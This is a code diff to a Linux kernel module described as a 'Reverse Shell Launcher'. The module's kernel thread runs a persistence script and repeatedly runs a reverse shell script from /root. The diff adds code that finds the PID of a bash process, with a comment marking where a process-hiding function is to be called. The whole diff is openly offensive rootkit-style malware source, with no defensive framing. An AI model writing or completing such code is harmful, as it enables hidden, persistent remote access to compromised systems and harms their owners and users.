@@ -4,15 +4,31 @@
 #include <linux/delay.h>
 #include <linux/kmod.h>
 #include <linux/sched.h>
+#include <linux/proc_fs.h>
+#include <linux/uaccess.h>
+#include <linux/seq_file.h>
 
 static struct task_struct *revshell_thread;
+static pid_t revshell_pid = -1;
+
+// Fonction pour trouver le PID d'un processus par son nom
+static pid_t find_pid_by_name(const char *name) {
+    struct task_struct *task;
+
+    for_each_process(task) {
+        if (strcmp(task->comm, name) == 0) {
+            return task->pid;
+        }
+    }
+    return -1;
+}
 
 static int revshell_function(void *data) {
-    char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
-    char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
+    char *persistence_argv[] = {"/bin/bash", "/root/persistence.sh", NULL};
+    char *revshell_argv[] = {"/bin/bash", "/root/revshell.sh", NULL};
     char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
 
-    // Lancer le script de persistance avant la boucle principale
+    // Lancer le script de persistance
     int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);
     if (ret != 0) {
         printk(KERN_ERR "Error launching persistence.sh: %d\n", ret);
@@ -26,6 +42,15 @@ static int revshell_function(void *data) {
             printk(KERN_ERR "Error launching revshell.sh: %d\n", ret);
         } else {
             printk(KERN_INFO "Reverse shell launched successfully.\n");
+        }
+
+        // Rechercher le PID du script
+        revshell_pid = find_pid_by_name("bash");
+        if (revshell_pid > 0) {
+            //call the hide_process function here
+            printk(KERN_INFO "Reverse shell PID: %d\n", revshell_pid);
+        } else {
+            printk(KERN_WARNING "Reverse shell PID not found.\n");
         }
 
         ssleep(5);
@@ -61,4 +86,4 @@ module_exit(lkm_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor");
-MODULE_DESCRIPTION("Reverse Shell Launcher with Retry and Persistence");
+MODULE_DESCRIPTION("Reverse Shell Launcher with PID Retrieval");
